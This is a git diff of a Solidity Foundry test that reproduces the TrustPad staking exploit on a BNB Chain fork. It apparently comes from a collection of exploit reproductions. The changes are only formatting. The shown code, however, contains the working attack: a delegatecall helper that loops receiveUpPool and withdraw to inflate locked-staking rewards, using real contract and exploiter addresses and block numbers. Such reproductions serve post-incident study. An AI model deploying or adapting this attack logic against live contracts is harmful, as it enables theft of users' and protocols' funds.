@@ -23,9 +23,7 @@ interface ILaunchpadLockableStaking {
 
     function withdraw(uint256 amount) external;
 
-    function userInfo(
-        address
-    )
+    function userInfo(address)
         external
         view
         returns (
@@ -44,20 +42,15 @@ interface ILaunchpadLockableStaking {
 contract ContractTest is Test {
     ILaunchpadLockableStaking private constant LaunchpadLockableStaking =
         ILaunchpadLockableStaking(0xE613c058701C768E0d04D1bf8e6a6dc1a0C6d48A);
-    IERC20 private constant TPAD =
-        IERC20(0xADCFC6bf853a0a8ad7f9Ff4244140D10cf01363C);
-    IERC20 private constant DDD =
-        IERC20(0x2e1FC745937a44ae8313bC889EE023ee303F2488);
-    IERC20 private constant WBNB =
-        IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
-    Uni_Router_V2 private constant Router =
-        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
-    address private constant TrustPadProtocolExploiter =
-        0x1a7b15354e2F6564fcf6960c79542DE251cE0dC9;
+    IERC20 private constant TPAD = IERC20(0xADCFC6bf853a0a8ad7f9Ff4244140D10cf01363C);
+    IERC20 private constant DDD = IERC20(0x2e1FC745937a44ae8313bC889EE023ee303F2488);
+    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    address private constant TrustPadProtocolExploiter = 0x1a7b15354e2F6564fcf6960c79542DE251cE0dC9;
     HelperContract helperContract;
 
     function setUp() public {
-        vm.createSelectFork("bsc", 33260104);
+        vm.createSelectFork("bsc", 33_260_104);
         vm.label(address(LaunchpadLockableStaking), "LaunchpadLockableStaking");
         vm.label(address(TPAD), "TPAD");
         vm.label(address(DDD), "DDD");
@@ -70,7 +63,7 @@ contract ContractTest is Test {
         // Getting TPAD amount
         WBNBToTPAD();
         // Jump to time when attack was happened
-        vm.roll(33260391);
+        vm.roll(33_260_391);
         uint256 startBalanceTPAD = TPAD.balanceOf(address(this));
 
         // Approve all DDD tokens from original exploiter to this attack contract
@@ -84,28 +77,19 @@ contract ContractTest is Test {
             TPAD.decimals()
         );
 
-        (bool success, ) = address(helperContract).delegatecall(
-            abi.encodeWithSignature(
-                "deposit(address,uint256,uint256)",
-                address(LaunchpadLockableStaking),
-                30,
-                1
-            )
+        (bool success,) = address(helperContract).delegatecall(
+            abi.encodeWithSignature("deposit(address,uint256,uint256)", address(LaunchpadLockableStaking), 30, 1)
         );
         require(success, "Delegatecall to deposit not successfull");
 
         assertEq(TPAD.balanceOf(address(this)), startBalanceTPAD - 1);
 
         // Jump to time when rewards were withdrew
-        vm.roll(33260396);
+        vm.roll(33_260_396);
 
         success = false;
-        (success, ) = address(helperContract).delegatecall(
-            abi.encodeWithSignature(
-                "withdraw(address,uint256)",
-                address(LaunchpadLockableStaking),
-                0
-            )
+        (success,) = address(helperContract).delegatecall(
+            abi.encodeWithSignature("withdraw(address,uint256)", address(LaunchpadLockableStaking), 0)
         );
         require(success, "Delegatecall to withdraw not successfull");
 
@@ -121,9 +105,9 @@ contract ContractTest is Test {
         path[0] = address(WBNB);
         path[1] = address(TPAD);
         uint256[] memory amounts = Router.getAmountsOut(20e15, path);
-        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{
-            value: 0.02 ether
-        }((amounts[1] * 9) / 10, path, address(this), block.timestamp);
+        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.02 ether}(
+            (amounts[1] * 9) / 10, path, address(this), block.timestamp
+        );
     }
 
     function isLocked(address account) external pure returns (bool) {
@@ -131,40 +115,30 @@ contract ContractTest is Test {
     }
 
     function depositLockStart(address addr) external returns (uint256) {
-        (bool success, ) = address(helperContract).delegatecall(
-            abi.encodeWithSignature("depositLockStart(address)", addr)
-        );
+        (bool success,) =
+            address(helperContract).delegatecall(abi.encodeWithSignature("depositLockStart(address)", addr));
         require(success, "Delegatecall to depositLockStart failed");
     }
 }
 
 contract HelperContract is Test {
-    IERC20 private constant DDD =
-        IERC20(0x2e1FC745937a44ae8313bC889EE023ee303F2488);
-    IERC20 private constant TPAD =
-        IERC20(0xADCFC6bf853a0a8ad7f9Ff4244140D10cf01363C);
-    address private constant TrustPadProtocolExploiter =
-        0x1a7b15354e2F6564fcf6960c79542DE251cE0dC9;
+    IERC20 private constant DDD = IERC20(0x2e1FC745937a44ae8313bC889EE023ee303F2488);
+    IERC20 private constant TPAD = IERC20(0xADCFC6bf853a0a8ad7f9Ff4244140D10cf01363C);
+    address private constant TrustPadProtocolExploiter = 0x1a7b15354e2F6564fcf6960c79542DE251cE0dC9;
     ILaunchpadLockableStaking private LaunchpadLockableStaking;
     uint256 private _depositLockStart;
 
     function deposit(address _for, uint256 _pid, uint256 _amount) external {
         LaunchpadLockableStaking = ILaunchpadLockableStaking(_for);
         DDD.transferFrom(TrustPadProtocolExploiter, address(this), 1);
-        require(
-            _depositLockStart == uint256(0),
-            "Deposit lock should be false at begining"
-        );
+        require(_depositLockStart == uint256(0), "Deposit lock should be false at begining");
         TPAD.approve(address(LaunchpadLockableStaking), type(uint256).max);
         uint256 withdrawAmount = TPAD.balanceOf(address(this));
 
         // Exploit start
         uint8 i;
         while (i < _pid) {
-            LaunchpadLockableStaking.receiveUpPool(
-                address(this),
-                withdrawAmount
-            );
+            LaunchpadLockableStaking.receiveUpPool(address(this), withdrawAmount);
             LaunchpadLockableStaking.withdraw(withdrawAmount);
             ++i;
         }
@@ -195,9 +169,7 @@ contract HelperContract is Test {
         DDD.transferFrom(TrustPadProtocolExploiter, address(this), 1);
         uint256 amountToWithdraw;
         if (_amount == 0) {
-            (uint256 amount, , , , ) = LaunchpadLockableStaking.userInfo(
-                address(this)
-            );
+            (uint256 amount,,,,) = LaunchpadLockableStaking.userInfo(address(this));
             amountToWithdraw = amount;
             emit log_uint(amount);
         } else {
